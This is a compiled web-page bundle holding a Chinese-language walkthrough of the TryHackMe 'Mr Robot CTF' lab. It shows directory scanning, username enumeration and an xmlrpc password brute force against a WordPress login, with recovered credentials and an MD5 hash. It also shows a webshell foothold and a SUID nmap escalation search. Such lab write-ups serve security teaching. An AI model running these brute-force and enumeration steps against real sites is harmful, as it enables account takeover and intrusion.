"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[4531],{60597:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>_,frontMatter:()=>s,metadata:()=>a,toc:()=>c});var o=t(74848),r=t(28453);const s={sidebar_position:79,tags:["Easy","Linux","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","SUID"],title:"Mr Robot CTF",description:"Mr Robot CTF",sidebar_label:"Mr Robot CTF",slug:"/tryhackme/79"},i="Mr Robot CTF",a={id:"box/TryHackMe/79",title:"Mr Robot CTF",description:"Mr Robot CTF",source:"@site/docs/box/TryHackMe/79.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/79",permalink:"/docs/tryhackme/79",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7"},{label:"SUID",permalink:"/docs/tags/suid"}],version:"current",sidebarPosition:79,frontMatter:{sidebar_position:79,tags:["Easy","Linux","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","SUID"],title:"Mr Robot CTF",description:"Mr Robot CTF",sidebar_label:"Mr Robot CTF",slug:"/tryhackme/79"},sidebar:"boxSidebar",previous:{title:"Cat Pictures 2",permalink:"/docs/tryhackme/78"},next:{title:"Attacktive Directory",permalink:"/docs/tryhackme/80"}},l={},c=[{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"daemon",id:"daemon",level:3},{value:"daemon \u2014&gt; robot",id:"daemon--robot",level:3},{value:"robot \u2014&gt; root",id:"robot--root",level:3}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(n.h1,{id:"mr-robot-ctf",children:"Mr Robot CTF"}),"\n",(0,o.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-163-117:~# gobuster dir -u http://10.10.136.237/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.136.237/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/09/10 15:02:14 Starting gobuster\n===============================================================\n.......\n/wp-content (Status: 301)\n/wp-login (Status: 200)\n/wp-login.php (Status: 200)\n/wp-includes (Status: 301)\n/js (Status: 301)\n/wp-register.php (Status: 301)\n/readme.html (Status: 200)\n/robots (Status: 200)\n/robots.txt (Status: 200)\n/dashboard (Status: 302)\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u6839\u636e\u76ee\u5f55\u626b\u63cf\u7ed3\u679c\u6211\u5224\u65ad\u8fd9\u662f\u4e00\u4e2a wordpress \u7f51\u7ad9, \u5f53\u6211\u67e5\u770b robots.txt \u65f6\u6211\u53d1\u73b0\u4e24\u4e2a\u6587\u4ef6:"}),"\n",(0,o.jsxs)(n.ul,{children:["\n",(0,o.jsx)(n.li,{children:"\u4e00\u4e2a\u662f flag"}),"\n",(0,o.jsxs)(n.li,{children:["\u4e00\u4e2a\u662f\u793e\u5de5\u5b57\u5178\n",(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703202546.png",alt:"20240703202546"})]}),"\n"]}),"\n",(0,o.jsx)(n.p,{children:"\u5c06\u5b57\u5178\u4e0b\u8f7d\u5230\u672c\u5730, \u6211\u53d1\u73b0\u5176\u4e2d\u7531\u5f88\u591a\u91cd\u590d\u5185\u5bb9, \u6240\u4ee5\u9700\u8981\u8fdb\u884c\u7b5b\u9009"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-163-117:~# wc fsocity.dic \n 858160  858160 7245381 fsocity.dic\nroot@ip-10-10-163-117:~# sort fsocity.dic | uniq > newfsocity.dic\nroot@ip-10-10-163-117:~# wc newfsocity.dic \n11451 11451 96747 newfsocity.dic\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u63a5\u7740\u6211\u8bbf\u95ee\u4e86 wordpress \u7684\u767b\u9646\u9875\u9762, \u53ef\u4ee5\u5728\u6b64\u5229\u7528\u5b57\u5178\u8fdb\u884c\u653b\u51fb\u9996\u5148\u679a\u4e3e\u7528\u6237\u540d"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-163-117:~# ffuf -w newfsocity.dic -u http://10.10.136.237/wp-login.php -X POST -d "log=FUZZ&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.136.237%2Fwp-admin%2F&testcookie=1" -H "Content-Type: application/x-www-form-urlencoded" -b "Cookie: s_cc=true; s_fid=7A2D01B6AAC036E6-117CD012261C3CD3; s_nr=1694354564210; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check" -fw 136\n\n        /\'___\\  /\'___\\           /\'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1\n________________________________________________\n\n :: Method           : POST\n :: URL              : http://10.10.136.237/wp-login.php\n :: Wordlist         : FUZZ: newfsocity.dic\n :: Header           : Content-Type: application/x-www-form-urlencoded\n :: Header           : Cookie: Cookie: s_cc=true; s_fid=7A2D01B6AAC036E6-117CD012261C3CD3; s_nr=1694354564210; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check\n :: Data             : log=FUZZ&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.136.237%2Fwp-admin%2F&testcookie=1\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response words: 136\n________________________________________________\n\nelliot                  [Status: 200, Size: 3651, Words: 144, Lines: 59]\nElliot                  [Status: 200, Size: 3651, Words: 144, Lines: 59]\nELLIOT                  [Status: 200, Size: 3651, Words: 144, Lines: 59]\n'})}),"\n",(0,o.jsx)(n.p,{children:"\u679a\u4e3e\u51fa\u7528\u6237\u540d\u63a5\u7740\u8fdb\u884c\u5bc6\u7801\u7684\u767b\u9646\u6d4b\u8bd5"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-163-117:~#  wpscan --password-attack xmlrpc -t 20 -U elliot -P ./newfsocity.dic --url http://10.10.136.237/\n.....\n[+] Performing password attack on Xmlrpc against 1 user/s\n[SUCCESS] - elliot / ER28-0652\n......\n"})}),"\n",(0,o.jsx)(n.p,{children:"\u83b7\u53d6\u5230\u5bc6\u7801\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u767b\u9646\u7f51\u7ad9\u4e0a\u4f20 webSHELL \u4e86"}),"\n",(0,o.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,o.jsx)(n.h3,{id:"daemon",children:"daemon"}),"\n",(0,o.jsx)(n.p,{children:"\u8bbf\u95ee\u6211\u4eec\u4e0a\u4f20\u7684 WEBShell \u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 Shell \u4e86"}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703202636.png",alt:"20240703202636"})}),"\n",(0,o.jsx)(n.h3,{id:"daemon--robot",children:"daemon \u2014> robot"}),"\n",(0,o.jsx)(n.p,{children:"\u5728 robot \u7528\u6237\u5bb6\u76ee\u5f55\u53d1\u73b0\u4e00\u4e2a\u6587\u4ef6\u4f7f\u7528 MD5 \u52a0\u5bc6, \u8fd9\u5e94\u8be5\u5c31\u662f\u7528\u6237 robot \u7684\u5bc6\u7801\u4e86"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"(remote) daemon@linux:/home/robot$ ls -al\ntotal 16\ndrwxr-xr-x 2 root  root  4096 Nov 13  2015 .\ndrwxr-xr-x 3 root  root  4096 Nov 13  2015 ..\n-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt\n-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5\n(remote) daemon@linux:/home/robot$ cat password.raw-md5 \nrobot:c3fcd3d76192e4007dfb496cca67e13b\n(remote) daemon@linux:/home/robot$\n"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703202742.png",alt:"20240703202742"})}),"\n",(0,o.jsx)(n.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u5bc6\u7801\u8fdb\u884c\u767b\u5f55"}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"(remote) daemon@linux:/home/robot$ su robot\nPassword: \nrobot@linux:~$ id\nuid=1002(robot) gid=1002(robot) groups=1002(robot)\nrobot@linux:~$\n"})}),"\n",(0,o.jsx)(n.h3,{id:"robot--root",children:"robot \u2014> root"}),"\n",(0,o.jsxs)(n.p,{children:["\u5728\u679a\u4e3e SUID \u65f6\u53d1\u73b0\u5b58\u5728\u4e00\u4e2a\u7279\u6b8a\u7684\u5e94\u7528\u7a0b\u5e8f ",(0,o.jsx)(n.a,{href:"https://gtfobins.github.io/gtfobins/nmap/#shell",children:"nmap#shell"})]}),"\n",(0,o.jsx)(n.pre,{children:(0,o.jsx)(n.code,{className:"language-bash",children:"robot@linux:~$ find / -user root -perm -4000 -print 2>/dev/null\n.....\n/usr/bin/sudo\n/usr/local/bin/nmap\n/usr/lib/openssh/ssh-keysign\n....\n"})}),"\n",(0,o.jsx)(n.p,{children:(0,o.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703202821.png",alt:"20240703202821"})})]})}function _(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,o.jsx)(n,{...e,children:(0,o.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>i,x:()=>a});var o=t(96540);const r={},s=o.createContext(r);function i(e){const n=o.useContext(s);return o.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:i(e.components),o.createElement(s.Provider,{value:n},e.children)}}}]);